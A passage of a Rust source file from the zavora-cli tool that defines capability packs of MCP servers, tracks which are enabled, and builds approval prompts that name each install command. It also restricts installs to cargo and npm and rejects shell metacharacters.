use std::collections::BTreeSet;
use std::fmt;
use std::path::{Path, PathBuf};
use std::sync::Arc;

use adk_rust::ReadonlyContext;
use adk_rust::prelude::{Tool, Toolset};
use anyhow::{Context, Result};
use async_trait::async_trait;
use clap::ValueEnum;
use serde::{Deserialize, Serialize};

pub const CAPABILITY_STATE_PATH: &str = ".zavora/capabilities.toml";

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize, ValueEnum)]
#[serde(rename_all = "kebab-case")]
pub enum CapabilityCategory {
    Productivity,
    Development,
    Research,
    Operations,
    Platform,
}

impl CapabilityCategory {
    pub const ALL: [Self; 5] = [
        Self::Productivity,
        Self::Development,
        Self::Research,
        Self::Operations,
        Self::Platform,
    ];

    pub fn label(self) -> &'static str {
        match self {
            Self::Productivity => "Productivity",
            Self::Development => "Development",
            Self::Research => "Research",
            Self::Operations => "Operations & Devices",
            Self::Platform => "Platform & Trust",
        }
    }
}

impl fmt::Display for CapabilityCategory {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(self.label())
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum CapabilityMaturity {
    Core,
    Certified,
    Preview,
}

impl fmt::Display for CapabilityMaturity {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(match self {
            Self::Core => "core",
            Self::Certified => "certified",
            Self::Preview => "preview",
        })
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "kebab-case")]
pub enum CapabilityRisk {
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for CapabilityRisk {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(match self {
            Self::Low => "low",
            Self::Medium => "medium",
            Self::High => "high",
            Self::Critical => "critical",
        })
    }
}

#[derive(Debug, Clone, Serialize)]
pub struct CapabilityPack {
    pub id: &'static str,
    pub name: &'static str,
    pub description: &'static str,
    pub category: CapabilityCategory,
    pub maturity: CapabilityMaturity,
    pub risk: CapabilityRisk,
    pub servers: &'static [&'static str],
    pub agent: &'static str,
}

const PACKS: &[CapabilityPack] = &[
    CapabilityPack {
        id: "productivity.office",
        name: "Office Artifacts",
        description: "Create and edit Word documents, presentations, spreadsheets, PDFs, and diagrams.",
        category: CapabilityCategory::Productivity,
        maturity: CapabilityMaturity::Certified,
        risk: CapabilityRisk::High,
        servers: &[
            "docx-mcp",
            "mcp-slides",
            "worksheet-mcp",
            "mcp-pdf",
            "mcp-flowchart",
        ],
        agent: "artifact_agent",
    },
    CapabilityPack {
        id: "productivity.communication",
        name: "Communication",
        description: "Work with email, calendars, Slack, messaging, and notifications.",
        category: CapabilityCategory::Productivity,
        maturity: CapabilityMaturity::Preview,
        risk: CapabilityRisk::High,
        servers: &[
            "mcp-email",
            "mcp-calendar",
            "mcp-slack",
            "mcp-messaging",
            "mcp-notifications",
        ],
        agent: "artifact_agent",
    },
    CapabilityPack {
        id: "productivity.work-management",
        name: "Work Management",
        description: "Manage tasks, projects, schedules, workflows, forms, and surveys.",
        category: CapabilityCategory::Productivity,
        maturity: CapabilityMaturity::Preview,
        risk: CapabilityRisk::Medium,
        servers: &[
            "mcp-task",
            "mcp-project",
            "mcp-scheduling",
            "mcp-workflow",
            "mcp-forms",
            "mcp-survey",
        ],
        agent: "artifact_agent",
    },
    CapabilityPack {
        id: "development.core",
        name: "Developer Core",
        description: "Repository, code search, testing, dependency, and security advisory tools.",
        category: CapabilityCategory::Development,
        maturity: CapabilityMaturity::Core,
        risk: CapabilityRisk::High,
        servers: &[
            "mcp-github",
            "mcp-code-search",
            "mcp-test-runner",
            "mcp-package-registry",
            "mcp-security-advisory",
        ],
        agent: "developer_agent",
    },
    CapabilityPack {
        id: "development.delivery",
        name: "Delivery & Runtime",
        description: "Operate CI/CD, containers, databases, infrastructure, environments, and observability.",
        category: CapabilityCategory::Development,
        maturity: CapabilityMaturity::Preview,
        risk: CapabilityRisk::Critical,
        servers: &[
            "mcp-cicd",
            "mcp-containers",
            "mcp-database",
            "mcp-infrastructure",
            "mcp-environment",
            "mcp-observability",
        ],
        agent: "developer_agent",
    },
    CapabilityPack {
        id: "research.core",
        name: "Research Core",
        description: "Search the web, browse sources, monitor news, and query knowledge bases.",
        category: CapabilityCategory::Research,
        maturity: CapabilityMaturity::Certified,
        risk: CapabilityRisk::Low,
        servers: &[
            "mcp-search",
            "mcp-browser",
            "mcp-news",
            "mcp-knowledge-base",
        ],
        agent: "research_agent",
    },
    CapabilityPack {
        id: "research.intelligence",
        name: "Domain Intelligence",
        description: "Research maps, weather, markets, legal, medical, pharmacy, property, and regulation.",
        category: CapabilityCategory::Research,
        maturity: CapabilityMaturity::Preview,
        risk: CapabilityRisk::Medium,
        servers: &[
            "mcp-maps",
            "mcp-weather",
            "mcp-market-data",
            "mcp-legal",
            "mcp-medical",
            "mcp-pharmacy",
            "mcp-real-estate",
            "mcp-regulatory",
        ],
        agent: "research_agent",
    },
    CapabilityPack {
        id: "operations.device",
        name: "Device Operations",
        description: "Inspect and manage desktops, endpoints, devices, IT service workflows, and IoT fleets.",
        category: CapabilityCategory::Operations,
        maturity: CapabilityMaturity::Preview,
        risk: CapabilityRisk::Critical,
        servers: &[
            "computer-use-mcp",
            "mcp-device-management",
            "mcp-itsm",
            "mcp-iot",
        ],
        agent: "operations_agent",
    },
    CapabilityPack {
        id: "operations.business",
        name: "Business Systems",
        description: "Connect CRM, ERP, finance, sales, marketing, HR, procurement, and logistics systems.",
        category: CapabilityCategory::Operations,
        maturity: CapabilityMaturity::Preview,
        risk: CapabilityRisk::High,
        servers: &[
            "mcp-crm",
            "mcp-erp",
            "mcp-finance",
            "mcp-sales",
            "mcp-marketing",
            "mcp-hris",
            "mcp-procurement",
            "mcp-logistics",
        ],
        agent: "operations_agent",
    },
    CapabilityPack {
        id: "platform.governed",
        name: "Governed Platform",
        description: "Provide registry, credentials, approvals, policy, identity, artifacts, memory, A2A, and ACP controls.",
        category: CapabilityCategory::Platform,
        maturity: CapabilityMaturity::Preview,
        risk: CapabilityRisk::Critical,
        servers: &[
            "mcp-registry",
            "mcp-credentials-vault",
            "mcp-approval",
            "mcp-governance-policy",
            "mcp-identity",
            "mcp-artifact-store",
            "mcp-session-memory",
            "mcp-a2a",
            "mcp-acp-workspace",
        ],
        agent: "reviewer_agent",
    },
];

#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct CapabilityState {
    #[serde(default)]
    pub enabled_packs: BTreeSet<String>,
}

pub fn built_in_packs() -> &'static [CapabilityPack] {
    PACKS
}

pub fn find_pack(id: &str) -> Option<&'static CapabilityPack> {
    PACKS.iter().find(|pack| pack.id == id)
}

pub fn state_path() -> PathBuf {
    std::env::var_os("ZAVORA_CAPABILITY_STATE")
        .map(PathBuf::from)
        .unwrap_or_else(|| PathBuf::from(CAPABILITY_STATE_PATH))
}

pub fn load_state(path: &Path) -> Result<CapabilityState> {
    if !path.exists() {
        return Ok(CapabilityState::default());
    }
    let content = std::fs::read_to_string(path)
        .with_context(|| format!("failed to read capability state '{}'", path.display()))?;
    toml::from_str(&content)
        .with_context(|| format!("invalid capability state '{}'", path.display()))
}

pub fn save_state(path: &Path, state: &CapabilityState) -> Result<()> {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).with_context(|| {
            format!(
                "failed to create capability directory '{}'",
                parent.display()
            )
        })?;
    }
    let payload = toml::to_string_pretty(state).context("failed to serialize capability state")?;
    std::fs::write(path, payload)
        .with_context(|| format!("failed to write capability state '{}'", path.display()))
}

/// Whether the running tool surface still matches what is configured.
///
/// Enabling a capability writes MCP servers into the profile, but the surface the
/// agent is using was sealed before they existed — sealing is deliberately
/// one-shot, so it cannot be amended in place. This flag is how the tool tells the
/// workspace that a rebuild is owed. The workspace consumes it between turns:
/// re-resolving mid-turn would swap the tool surface out from under an in-flight
/// request.
static SURFACE_STALE: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);

/// Record that configuration has moved ahead of the running tool surface.
pub fn mark_surface_stale() {
    SURFACE_STALE.store(true, std::sync::atomic::Ordering::SeqCst);
}

/// Take the stale flag, clearing it.
///
/// Clearing on read means a failed rebuild does not spin: the next enable sets it
/// again, and a transient connection failure is reported rather than retried
/// forever.
pub fn take_surface_stale() -> bool {
    SURFACE_STALE.swap(false, std::sync::atomic::Ordering::SeqCst)
}

pub fn set_pack_enabled(path: &Path, id: &str, enabled: bool) -> Result<bool> {
    if find_pack(id).is_none() {
        return Err(anyhow::anyhow!(
            "capability pack '{id}' not found. Run 'zavora-cli capabilities list'."
        ));
    }
    let mut state = load_state(path)?;
    let changed = if enabled {
        state.enabled_packs.insert(id.to_string())
    } else {
        state.enabled_packs.remove(id)
    };
    save_state(path, &state)?;
    Ok(changed)
}

pub fn packs_for_category(
    category: CapabilityCategory,
) -> impl Iterator<Item = &'static CapabilityPack> {
    PACKS.iter().filter(move |pack| pack.category == category)
}

/// Programs a curated install line is permitted to invoke.
///
/// The catalogue's install lines are static, so this cannot be reached by
/// anything a model or a prompt supplies. It exists so a future catalogue edit
/// cannot smuggle in a different program, and so the install path never needs a
/// shell.
pub const INSTALL_PROGRAMS: &[&str] = &["cargo", "npm"];

/// Characters that would give an install line shell semantics.
const SHELL_METACHARACTERS: &[char] = &[
    ';', '|', '&', '$', '>', '<', '`', '(', ')', '{', '}', '\n', '\r', '\\', '\'', '"', '*', '?',
    '~', '#', '!',
];

/// Split a curated install line into an argument vector.
///
/// Returns an error rather than a best guess when the line is not something this
/// code is willing to run. Installing is the one action here that executes
/// third-party code, so the command must be exact and must never reach a shell:
/// the argument vector is handed to `Command` directly, so metacharacters would
/// be passed through literally rather than interpreted — but a line containing
/// them is a sign the catalogue changed shape, and guessing would be worse than
/// refusing.
pub fn install_argv(line: &str) -> Result<Vec<&str>> {
    if let Some(bad) = line.chars().find(|c| SHELL_METACHARACTERS.contains(c)) {
        return Err(anyhow::anyhow!(
            "install command '{line}' contains '{bad}', which this installer will not run"
        ));
    }
    let argv: Vec<&str> = line.split_whitespace().collect();
    let program = argv
        .first()
        .ok_or_else(|| anyhow::anyhow!("install command is empty"))?;
    if !INSTALL_PROGRAMS.contains(program) {
        return Err(anyhow::anyhow!(
            "install command '{line}' invokes '{program}', which is not one of {:?}",
            INSTALL_PROGRAMS
        ));
    }
    Ok(argv)
}

/// Whether a program can be found on `PATH`.
///
/// Resolved directly rather than by running `which`, so nothing is executed just
/// to answer the question.
pub fn program_on_path(program: &str) -> bool {
    if program.contains('/') {
        return Path::new(program).is_file();
    }
    let Some(path) = std::env::var_os("PATH") else {
        return false;
    };
    std::env::split_paths(&path).any(|dir| {
        let candidate = dir.join(program);
        candidate.is_file() || cfg!(windows) && candidate.with_extension("exe").is_file()
    })
}

/// How ready one MCP server of a capability is.
///
/// `installed` and `configured` are separate because they fail separately, and
/// neither implies the server is usable. There is deliberately no `connected`
/// field: connection can only be established by a live handshake, which
/// `zavora-cli mcp doctor` performs. Reporting it from static state would be the
/// exact overclaim the workspace instructions forbid.
///
/// `command` and `install` are absent when the server is named by a capability
/// but has no entry in the curated MCP catalogue. Most are: the packs describe an
/// intended surface, and the catalogue currently covers a minority of it. Such a
/// server cannot be provisioned at all, and saying so is the difference between a
/// capability that works and one that merely reports `enabled = true`.
#[derive(Debug, Clone, Serialize)]
pub struct ServerReadiness {
    pub id: String,
    pub name: Option<&'static str>,
    pub command: Option<&'static str>,
    pub install: Option<&'static str>,
    /// The server has a curated catalogue entry, so it can be provisioned.
    pub available: bool,
    /// The server's program resolves on `PATH`.
    pub installed: bool,
    /// The server is listed in this profile's `mcp_servers`.
    pub configured: bool,
}

/// What enabling a capability would actually change.
///
/// Computed before asking the developer, so the approval names the specific
/// install commands rather than the capability in the abstract.
#[derive(Debug, Clone, Serialize)]
pub struct EnablePlan {
    pub pack_id: &'static str,
    pub pack_name: &'static str,
    pub description: &'static str,
    pub risk: CapabilityRisk,
    pub maturity: CapabilityMaturity,
    pub agent: &'static str,
    pub already_enabled: bool,
    pub servers: Vec<ServerReadiness>,
}

impl EnablePlan {
    /// Servers that have a curated catalogue entry.
    pub fn provisionable(&self) -> Vec<&ServerReadiness> {
        self.servers.iter().filter(|s| s.available).collect()
    }

    /// Servers this capability names but which cannot be provisioned.
    pub fn unavailable(&self) -> Vec<&ServerReadiness> {
        self.servers.iter().filter(|s| !s.available).collect()
    }

    /// Servers whose program is missing and would be installed.
    pub fn to_install(&self) -> Vec<&ServerReadiness> {
        self.servers
            .iter()
            .filter(|s| s.available && !s.installed)
            .collect()
    }

    /// Servers not yet present in the profile's configuration.
    pub fn to_configure(&self) -> Vec<&ServerReadiness> {
        self.servers
            .iter()
            .filter(|s| s.available && !s.configured)
            .collect()
    }

    /// Whether applying this plan would change nothing.
    pub fn is_noop(&self) -> bool {
        self.already_enabled && self.to_install().is_empty() && self.to_configure().is_empty()
    }

    /// The question put to the developer before anything is installed.
    ///
    /// Names the capability and every install command, because "enable office
    /// support" and "compile and install four programs from the internet" are the
    /// same request described at two very different levels of consequence, and
    /// only the second one is what actually happens. Kept compact: the approval
    /// panel truncates.
    pub fn approval_prompt(&self) -> String {
        // Say so before asking. A capability with nothing installable is refused
        // when applied, so presenting it as a decision would be asking the
        // developer to approve a no-op.
        if self.provisionable().is_empty() {
            return format!(
                "\"{}\" ({}) cannot be enabled: none of its {} MCP servers has an \
                 installable package in the curated catalogue, so enabling it would \
                 change a flag and nothing else.",
                self.pack_name,
                self.pack_id,
                self.servers.len(),
            );
        }
        let installs = self.to_install();
        let mut out = if installs.is_empty() {
            format!("Enable \"{}\" ({})?\n", self.pack_name, self.pack_id)
        } else {
            format!(
                "Install {} {} to enable \"{}\" ({})?\n",
                installs.len(),
                if installs.len() == 1 {
                    "package"
                } else {
                    "packages"
                },
                self.pack_name,
                self.pack_id
            )
        };
        for server in &installs {
            if let Some(install) = server.install {
                out.push_str(&format!("  {install}\n"));
            }
        }
        let configure = self.to_configure().len();
        if configure > 0 {
            out.push_str(&format!(
                "Then configures {configure} MCP server{} and enables the capability.\n",
                if configure == 1 { "" } else { "s" }
            ));
        }
        // Never let the count of what will work be inferred from the count of
        // what the capability claims.
        let unavailable = self.unavailable().len();
        if unavailable > 0 {
            out.push_str(&format!(
                "{unavailable} of this capability's {} servers have no installable package and will stay missing.\n",
                self.servers.len()
            ));
        }
        out.push_str(&format!(
            "risk {} · {} · runs third-party code · enabling does not make the servers usable until they connect.",
            self.risk, self.maturity,
        ));
        out
    }
}

/// Work out what enabling `pack_id` would change, without changing anything.
pub fn plan_enable(pack_id: &str, config_path: &Path, profile: &str) -> Result<EnablePlan> {
    let pack = find_pack(pack_id).ok_or_else(|| {
        anyhow::anyhow!(
            "capability '{pack_id}' is not one of the built-in capabilities. \
             Run 'zavora-cli capabilities list'."
        )
    })?;
    let configured =
        crate::mcp_catalog::configured_server_ids(config_path, profile).unwrap_or_default();
    let enabled = load_state(&state_path())
        .map(|state| state.enabled_packs.contains(pack_id))
        .unwrap_or(false);

    // Every server the pack names is reported, including the ones with no
    // catalogue entry. Dropping those would make a pack that cannot work look
    // like one that merely needs installing.
    let servers = pack
        .servers
        .iter()
        .map(|id| match crate::mcp_catalog::find_entry(id) {
            Some(entry) => ServerReadiness {
                id: entry.id.to_string(),
                name: Some(entry.name),
                command: Some(entry.command),
                install: Some(entry.install),
                available: true,
                installed: program_on_path(entry.command),
                configured: configured.contains(entry.id),
            },
            None => ServerReadiness {
                id: (*id).to_string(),
                name: None,
                command: None,
                install: None,
                available: false,
                installed: false,
                configured: configured.contains(*id),
            },
        })
        .collect();

    Ok(EnablePlan {
        pack_id: pack.id,
        pack_name: pack.name,
        description: pack.description,
        risk: pack.risk,
        maturity: pack.maturity,
        agent: pack.agent,
        already_enabled: enabled,
        servers,
    })
}

pub fn search_packs(query: &str) -> Vec<&'static CapabilityPack> {
    let terms = query
        .to_ascii_lowercase()
        .split_whitespace()
        .map(str::to_string)
        .collect::<Vec<_>>();
    if terms.is_empty() {
        return PACKS.iter().collect();
    }
    PACKS
        .iter()
        .filter(|pack| {
            let haystack = format!(
                "{} {} {} {} {}",
                pack.id,
                pack.name,
                pack.description,
                pack.category.label(),
                pack.servers.join(" ")
            )
            .to_ascii_lowercase();
            terms.iter().all(|term| haystack.contains(term))
        })
        .collect()
}

pub fn category_for_prompt(prompt: &str) -> BTreeSet<CapabilityCategory> {
    let prompt = prompt.to_ascii_lowercase();
    CapabilityCategory::ALL
        .into_iter()
        .filter(|category| {
            category_keywords(*category)
                .iter()
                .any(|word| prompt.contains(word))
        })
        .collect()
}

fn category_keywords(category: CapabilityCategory) -> &'static [&'static str] {
    match category {
        CapabilityCategory::Productivity => &[
            "document",
            "docx",
            "word",
            "slide",
            "presentation",
            "powerpoint",
            "spreadsheet",
            "excel",
            "xlsx",
            "pdf",
            "email",
            "calendar",
            "meeting",
            "task",
            "project",
            "artifact",
            "canvas",
            "design",
            "communication",
            "memo",
            "report",
        ],
        CapabilityCategory::Development => &[
            "code",
            "repo",
            "github",
            "git",
            "test",
            "compile",
            "dependency",
            "database",
            "container",
            "docker",
            "deploy",
            "pipeline",
            "ci",
            "bug",
            "frontend",
            "webapp",
            "api",
            "mcp",
            "programming",
        ],
        CapabilityCategory::Research => &[
            "research",
            "search",
            "source",
            "news",
            "current",
            "web",
            "market",
            "weather",
            "map",
            "legal",
            "medical",
            "pharmacy",
            "evidence",
            "literature",
            "study",
        ],
        CapabilityCategory::Operations => &[
            "device",
            "desktop",
            "computer",
            "process",
            "service",
            "incident",
            "infrastructure",
            "system",
            "endpoint",
            "inventory",
            "crm",
            "erp",
            "finance",
            "sales",
            "operations",
        ],
        CapabilityCategory::Platform => &[
            "governance",
            "approval",
            "policy",
            "credential",
            "identity",
            "registry",
            "audit",
            "a2a",
            "acp",
            "agent protocol",
            "artifact store",
        ],
    }
}

fn tool_matches_category(tool: &dyn Tool, category: CapabilityCategory) -> bool {
    let haystack = format!("{} {}", tool.name(), tool.description()).to_ascii_lowercase();
    category_keywords(category)
        .iter()
        .any(|keyword| haystack.contains(keyword))
}

fn is_core_tool(name: &str) -> bool {
    matches!(
        name,
        "time_agent" | "memory_agent" | "tool_search" | "plan_work" | "current_unix_time"
    )
}

/// Resolves only the tool categories relevant to the current invocation.
/// If no category can be inferred, it returns the complete set so routing never
/// silently removes a capability from an ambiguous request.
pub struct CapabilityToolset {
    name: String,
    tools: Vec<Arc<dyn Tool>>,
    fixed_category: Option<CapabilityCategory>,
}

impl CapabilityToolset {
    pub fn routed(name: impl Into<String>, tools: Vec<Arc<dyn Tool>>) -> Self {
        Self {
            name: name.into(),
            tools,
            fixed_category: None,
        }
    }

    pub fn specialist(
        name: impl Into<String>,
        category: CapabilityCategory,
        tools: Vec<Arc<dyn Tool>>,
    ) -> Self {
        Self {
            name: name.into(),
            tools,
            fixed_category: Some(category),
        }
    }

    fn select(&self, prompt: &str) -> Vec<Arc<dyn Tool>> {
        let categories = self
            .fixed_category
            .map(|category| BTreeSet::from([category]))
            .unwrap_or_else(|| category_for_prompt(prompt));

        if categories.is_empty() {
            return self.tools.clone();
        }

        let selected = self
            .tools
            .iter()
            .filter(|tool| {
                is_core_tool(tool.name())
                    || categories
                        .iter()
                        .any(|category| tool_matches_category(tool.as_ref(), *category))
            })
            .cloned()
            .collect::<Vec<_>>();

        if selected.iter().any(|tool| !is_core_tool(tool.name())) {
            selected
        } else {
            // A server may use domain-specific tool names that the catalog cannot
            // classify yet. Falling back keeps that server usable until metadata is certified.
            self.tools.clone()
        }
    }
}

#[async_trait]
impl Toolset for CapabilityToolset {
    fn name(&self) -> &str {
        &self.name
    }

    async fn tools(&self, ctx: Arc<dyn ReadonlyContext>) -> adk_rust::Result<Vec<Arc<dyn Tool>>> {
        let prompt = ctx
            .user_content()
            .parts
            .iter()
            .filter_map(|part| part.text())
            .collect::<Vec<_>>()
            .join("\n");
        Ok(self.select(&prompt))
    }
}

#[derive(Debug, Clone, Serialize)]
pub struct CapabilitySkill {
    pub name: String,
    pub description: String,
    pub path: String,
    pub category: Option<CapabilityCategory>,
}

#[derive(Debug, Clone, Serialize)]
pub struct CapabilityAgent {
    pub name: String,
    pub description: String,
    pub source: String,
}

#[derive(Debug, Clone, Default, Serialize)]
pub struct CapabilitySnapshot {
    pub skills: Vec<CapabilitySkill>,
    pub plugins: Vec<crate::plugins::PluginDescriptor>,
    pub agents: Vec<CapabilityAgent>,
    pub configured_mcp_servers: Vec<String>,
    pub connected_mcp_tools: Vec<String>,
}

fn parse_category(value: &str) -> Option<CapabilityCategory> {
    match value.trim().to_ascii_lowercase().as_str() {
        "productivity" => Some(CapabilityCategory::Productivity),
        "development" | "developer" => Some(CapabilityCategory::Development),
        "research" => Some(CapabilityCategory::Research),
        "operations" | "devices" | "operations-and-devices" => Some(CapabilityCategory::Operations),
        "platform" | "trust" | "platform-and-trust" => Some(CapabilityCategory::Platform),
        _ => None,
    }
}

fn skill_category(skill: &adk_skill::SkillDocument) -> Option<CapabilityCategory> {
    let explicit = skill
        .metadata
        .get("zavora")
        .and_then(serde_json::Value::as_object)
        .and_then(|metadata| metadata.get("category"))
        .or_else(|| skill.metadata.get("category"))
        .and_then(serde_json::Value::as_str)
        .and_then(parse_category);
    if explicit.is_some() {
        return explicit;
    }
    let tokenize = |value: &str| {
        value
            .split(|character: char| !character.is_ascii_alphanumeric())
            .filter(|token| !token.is_empty())
            .map(str::to_ascii_lowercase)
            .collect::<BTreeSet<_>>()
    };
    let name = tokenize(&skill.name);
    let description = tokenize(&skill.description);
    let tags = tokenize(&skill.tags.join(" "));
    // Prefer developer semantics on ties: names such as `frontend-design`
    // describe a development skill even though "design" is also productive work.
    let order = [
        CapabilityCategory::Development,
        CapabilityCategory::Productivity,
        CapabilityCategory::Research,
        CapabilityCategory::Operations,
        CapabilityCategory::Platform,
    ];
    let mut best = None;
    for category in order {
        let score = category_keywords(category)
            .iter()
            .map(|keyword| {
                let keyword = keyword.to_ascii_lowercase();
                usize::from(name.contains(&keyword)) * 4
                    + usize::from(tags.contains(&keyword)) * 2
                    + usize::from(description.contains(&keyword))
            })
            .sum::<usize>();
        if score > best.map_or(0, |(_, current_score)| current_score) {
            best = Some((category, score));
        }
    }
    best.map(|(category, _)| category)
}

impl CapabilitySnapshot {
    pub fn load(configured_servers: &[String], connected_tools: &[String]) -> Result<Self> {
        let skills = crate::skills::load_workspace_skills()?
            .skills()
            .iter()
            .map(|skill| CapabilitySkill {
                name: skill.name.clone(),
                description: skill.description.clone(),
                path: skill.path.display().to_string(),
                category: skill_category(skill),
            })
            .collect::<Vec<_>>();
        let mut resolved_agents =
            crate::config::load_resolved_agents(&crate::config::default_agent_paths())?;
        resolved_agents.extend(crate::plugins::enabled_plugin_agents()?);
        let mut agents = resolved_agents
            .into_values()
            .map(|agent| CapabilityAgent {
                name: agent.name,
                description: agent.config.description.unwrap_or_default(),
                source: agent.source.label().to_string(),
            })
            .collect::<Vec<_>>();
        agents.sort_by(|left, right| left.name.cmp(&right.name));
        let plugins = crate::plugins::discover_plugins()?;

        let mut configured_mcp_servers = configured_servers.to_vec();
        configured_mcp_servers.sort();
        configured_mcp_servers.dedup();
        let mut connected_mcp_tools = connected_tools.to_vec();
        connected_mcp_tools.sort();
        connected_mcp_tools.dedup();
        Ok(Self {
            skills,
            plugins,
            agents,
            configured_mcp_servers,
            connected_mcp_tools,
        })
    }

    fn skills_for(&self, category: CapabilityCategory) -> Vec<&CapabilitySkill> {
        self.skills
            .iter()
            .filter(|skill| skill.category == Some(category))
            .collect()
    }
}

pub fn format_prompt_capabilities(
    configured_servers: &[String],
    connected_tools: &[String],
) -> String {
    let snapshot = match CapabilitySnapshot::load(configured_servers, connected_tools) {
        Ok(snapshot) => snapshot,
        Err(error) => return format!("Capability registry unavailable: {error}"),
    };
    let mut lines = vec![
        "This is the live capability registry for the current session. Distinguish installed skills, configured servers, and connected tools; never claim a catalog recipe is usable unless its runtime dependency is connected.".to_string(),
        format!(
            "Status: {} skills; {} plugins; {} registered agents; {} configured MCP servers; {} connected MCP tools.",
            snapshot.skills.len(),
            snapshot.plugins.len(),
            snapshot.agents.len(),
            snapshot.configured_mcp_servers.len(),
            snapshot.connected_mcp_tools.len()
        ),
    ];
    for category in CapabilityCategory::ALL {
        let skills = snapshot.skills_for(category);
        let names = skills
            .iter()
            .map(|skill| skill.name.as_str())
            .collect::<Vec<_>>();
        lines.push(format!(
            "{} skills: {}",
            category.label(),
            if names.is_empty() {
                "none".to_string()
            } else {
                names.join(", ")
            }
        ));
    }
    lines.push(format!(
        "Plugins: {}",
        if snapshot.plugins.is_empty() {
            "none".to_string()
        } else {
            snapshot
                .plugins
                .iter()
                .map(|plugin| format!("{} ({})", plugin.name, plugin.ecosystem))
                .collect::<Vec<_>>()
                .join(", ")
        }
    ));
    lines.push(format!(
        "Agents: {}",
        snapshot
            .agents
            .iter()
            .map(|agent| agent.name.as_str())
            .collect::<Vec<_>>()
            .join(", ")
    ));
    lines.join("\n")
}

pub fn format_catalog_markdown_with_runtime(
    configured_servers: &[String],
    connected_tools: &[String],
) -> String {
    // Requirement 9.3: a parse failure must be reported, never presented as an
    // empty capability set. "0 skills · 0 plugins · 0 agents" from a malformed
    // third-party manifest is indistinguishable from a correct empty install.
    let state = match load_state(&state_path()) {
        Ok(state) => state,
        Err(error) => {
            return format!(
                "## Live capabilities\n\nCould not read capability state: {error}\n\nFix `{}` or remove it; capability status is unavailable until then.\n",
                state_path().display()
            );
        }
    };
    let configured = configured_servers
        .iter()
        .map(|name| name.to_ascii_lowercase())
        .collect::<BTreeSet<_>>();
    let snapshot = match CapabilitySnapshot::load(configured_servers, connected_tools) {
        Ok(snapshot) => snapshot,
        Err(error) => {
            return format!(
                "## Live capabilities\n\nCould not inspect capabilities: {error}\n\nA skill, plugin, or agent manifest failed to parse. Run `zavora-cli plugins doctor` for detail.\n"
            );
        }
    };
    let mut output = format!(
        "## Live capabilities\n\n- **Skills:** {} discovered\n- **Plugins:** {} discovered\n- **Agents:** {} registered\n- **MCP:** {} configured · {} connected tools\n\n",
        snapshot.skills.len(),
        snapshot.plugins.len(),
        snapshot.agents.len(),
        snapshot.configured_mcp_servers.len(),
        snapshot.connected_mcp_tools.len()
    );
    for category in CapabilityCategory::ALL {
        output.push_str(&format!("### {}\n\n", category.label()));
        let skills = snapshot.skills_for(category);
        if skills.is_empty() {
            output.push_str("Skills: _none discovered_\n\n");
        } else {
            output.push_str(&format!(
                "Skills: {}\n\n",
                skills
                    .iter()
                    .map(|skill| format!("`{}`", skill.name))
                    .collect::<Vec<_>>()
                    .join(", ")
            ));
        }
        for pack in packs_for_category(category) {
            let enabled = state.enabled_packs.contains(pack.id);
            let configured_count = pack
                .servers
                .iter()
                .filter(|server| configured.contains(&server.to_ascii_lowercase()))
                .count();
            output.push_str(&format!(
                "- **{}** (`{}`) — {} · {} · {}/{} servers configured\n",
                pack.name,
                pack.id,
                if enabled { "enabled" } else { "disabled" },
                pack.maturity,
                configured_count,
                pack.servers.len()
            ));
        }
        output.push('\n');
    }
    let unclassified = snapshot
        .skills
        .iter()
        .filter(|skill| skill.category.is_none())
        .map(|skill| format!("`{}`", skill.name))
        .collect::<Vec<_>>();
    if !unclassified.is_empty() {
        output.push_str(&format!(
            "### Other discovered skills\n\n{}\n\n",
            unclassified.join(", ")
        ));
    }
    output.push_str(
        "_A recipe being enabled does not mean its MCP servers are configured or connected._\n",
    );
    output
}

pub fn format_catalog_markdown(configured_servers: &[String]) -> String {
    format_catalog_markdown_with_runtime(configured_servers, &[])
}

fn pack_json(
    pack: &CapabilityPack,
    state: &CapabilityState,
    snapshot: &CapabilitySnapshot,
) -> serde_json::Value {
    let configured = snapshot
        .configured_mcp_servers
        .iter()
        .map(|name| name.to_ascii_lowercase())
        .collect::<BTreeSet<_>>();
    serde_json::json!({
        "id": pack.id,
        "name": pack.name,
        "description": pack.description,
        "category": pack.category,
        "maturity": pack.maturity,
        "risk": pack.risk,
        "enabled": state.enabled_packs.contains(pack.id),
        "servers": pack.servers,
        "configured_servers": pack.servers.iter().filter(|server| configured.contains(&server.to_ascii_lowercase())).collect::<Vec<_>>(),
        "discovered_category_skills": snapshot.skills_for(pack.category).iter().map(|skill| skill.name.as_str()).collect::<Vec<_>>(),
        "agent": pack.agent,
    })
}

pub fn run_capabilities_list(
    category: Option<CapabilityCategory>,
    enabled_only: bool,
    json: bool,
    configured_servers: &[String],
) -> Result<()> {
    let state = load_state(&state_path())?;
    let snapshot = CapabilitySnapshot::load(configured_servers, &[])
        .context("failed to inspect live capabilities")?;
    let packs = PACKS
        .iter()
        .filter(|pack| category.is_none_or(|category| pack.category == category))
        .filter(|pack| !enabled_only || state.enabled_packs.contains(pack.id))
        .collect::<Vec<_>>();

    if json {
        let payload = packs
            .iter()
            .map(|pack| pack_json(pack, &state, &snapshot))
            .collect::<Vec<_>>();
        println!("{}", serde_json::to_string_pretty(&payload)?);
        return Ok(());
    }

    if packs.is_empty() {
        println!("No capability packs matched.");
        return Ok(());
    }
    let mut current_category = None;
    for pack in packs {
        if current_category != Some(pack.category) {
            current_category = Some(pack.category);
            println!("{}:", pack.category.label());
            let category_skills = snapshot
                .skills_for(pack.category)
                .iter()
                .map(|skill| skill.name.as_str())
                .collect::<Vec<_>>();
            println!(
                "  skills: {}",
                if category_skills.is_empty() {
                    "<none>".to_string()
                } else {
                    category_skills.join(", ")
                }
            );
        }
        let configured_count = pack
            .servers
            .iter()
            .filter(|server| {
